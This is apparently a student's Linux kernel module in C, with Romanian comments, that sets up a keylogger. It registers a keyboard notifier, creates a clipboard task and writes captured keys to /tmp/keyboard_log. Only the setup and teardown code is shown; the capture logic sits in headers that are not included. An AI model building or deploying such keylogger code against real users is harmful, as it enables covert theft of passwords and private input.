#include "struct_keylogger.h"
#include "keyboard_callback.h"
#include "write_to_file.h"
#include "clipboard_task.h"

#define LOG_FILE_PATH "/tmp/keyboard_log"
#define CLIPBOARD_FILENAME "/proc/keyboard_clipboard"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Raluca+Bogdan");
MODULE_DESCRIPTION("Un simplu modul pentru logarea tastelor");

static struct KEYLOGGER *keylogger;
static struct CLIPBOARD *clipboard;

static int __init keyboard_logger_init(void) 
{
    pr_info("Step 1: Allocating memory for keylogger\n");
    keylogger=kzalloc(sizeof(KEYLOGGER),GFP_KERNEL);//kzalloc seteaza cu 0 peste tot
    if(keylogger==NULL)
    {
        pr_err("Nu se poate aloca memorie pt keylogger\n");
        kfree(keylogger);
        return -ENOMEM;
    }
    //mutex_init(&(clipboard->lock));

    keylogger->key_notifier.notifier_call=keyboard_callback;
    
    INIT_WORK(&keylogger->work_struct,&write_to_file);//leaga workqueue cu functia(handler)
    INIT_WORK(&keylogger->work_clipboard, &clipboard_task);

    if(IS_ERR(keylogger->filename = filp_open(LOG_FILE_PATH, O_CREAT | O_RDWR, 0644)))
    {
        pr_info("Unable to create a log file\n");
    	return -EINVAL;
	}
    keylogger->keyboard_read_buffer=keylogger->main_buffer;
    keylogger->write_buffer=keylogger->back_buffer;
    register_keyboard_notifier(&keylogger->key_notifier);

   

    return 0;
}

static void __exit keyboard_logger_exit(void) {
    if (keylogger) {
        // Asigură-te că task-urile sunt terminate înainte de a le elibera
        flush_work(&keylogger->work_clipboard);  // Task-ul de clipboard
        flush_work(&keylogger->work_struct);     // Orice alt task asociat work_struct

        // De-înregistrează notifier-ul de la tastatură
        unregister_keyboard_notifier(&keylogger->key_notifier);

        // Închide fișierul dacă a fost deschis
        if (keylogger->filename) {
            filp_close(keylogger->filename, NULL);
        }

        // Eliberează memoria
        kfree(keylogger);
    }
}

module_init(keyboard_logger_init);
module_exit(keyboard_logger_exit);